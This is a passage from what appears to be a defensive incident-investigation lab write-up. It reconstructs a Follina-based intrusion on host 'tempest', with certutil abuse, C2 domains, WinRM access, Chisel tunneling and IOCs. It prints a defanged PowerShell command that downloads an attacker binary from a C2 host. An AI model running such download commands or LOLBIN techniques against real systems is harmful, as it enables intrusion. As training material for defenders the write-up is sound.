...
## Objective
- Reconstruct full attack chain from endpoint and network artefacts
- Identify initial access vector and exploited vulnerability
...
**Initial Access**
SOC analyst confirmed intrusion began with a malicious `.doc` downloaded via `chrome.exe`. Followed child processes of `winword.exe` in SysmonView — identified malicious document `free_magicules.doc`, executed by user `benimaru` on host `tempest`.
...
Same Executable Info tab referenced `msdt.exe` against PID 496. Cross-referencing `msdt.exe` and PID 496 in open-source research identified the exploit: **CVE-2022-30190 (Follina)** — MSDT URL protocol abuse for remote code execution via malicious Office document.

**Stage 2 — Autostart Execution**
Per investigation guidance, autostart execution reflects `explorer.exe` as parent process ID following user logon. Filtered Timeline Explorer for `explorer.exe`, found in Executable Info: `-w hidden -noni certutil`. Full command recovered:
````
...
````
`certutil.exe` abused as a LOLBIN to download and execute `first.exe`. SHA256 hash recovered from Payload Data3 tab. Filtered Event ID 22 (DNS query) for `first.exe` activity — identified second-stage C2 domain `resolvecyber.xyz`.
...
````
Identified malicious payload URL. CyberChef Magic function decoded additional Base64 strings recovered from the capture — recovered a password used by the attacker (decoded via CyberChef).

Port 5985 (WinRM) identified in traffic — confirms remote shell access vector. Further decoding revealed:
````
powershell iwr hxxp[://]phishteam[.]xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
````
Searched logs for `ch.exe` — recovered SHA256 hash. VirusTotal lookup identified the binary as **Chisel**, a reverse SOCKS proxy tool, confirming attacker used WinRM for authenticated access and Chisel for tunneling.
...
- **C2 domain (stage 1):** `phishteam[.]xyz` → `167.71.199.191`
- **C2 domain (stage 2):** `resolvecyber.xyz`
- **Persistence (autostart):** `update.zip` extracted to Startup folder
...
- **Final C2 channel:** `final.exe` — port 8080
- **Persistence (accounts):** New local accounts `shion`, `shuna` created

## Analysis & Response
- Isolate host `tempest` immediately
- Disable accounts `shion` and `shuna`
- Block `phishteam[.]xyz` and `resolvecyber.xyz` at perimeter
- Hunt for `first.exe`, `ch.exe`, `spf.exe`, `final.exe` hashes across environment
...
## MITRE ATT&CK
- Exploitation for Client Execution (T1203) — Follina exploited via malicious Word document
...
- Boot or Logon Autostart Execution: Startup Folder (T1547.001) — payload persisted via Startup folder
...
- Remote Services: Windows Remote Management (T1021.006) — WinRM used for lateral movement/authentication
...
- Chisel is a common attacker tool for SOCKS proxy tunneling — VirusTotal hash lookup is fast confirmation
- PrintSpoofer + `SeImpersonatePrivilege` is a frequent Windows privilege escalation path worth fingerprinting in detection rules
- Multi-stage payload delivery (doc → PowerShell → certutil → Chisel → PrintSpoofer) demonstrates the value of correlating Sysmon, DNS, and PCAP data sources together
````
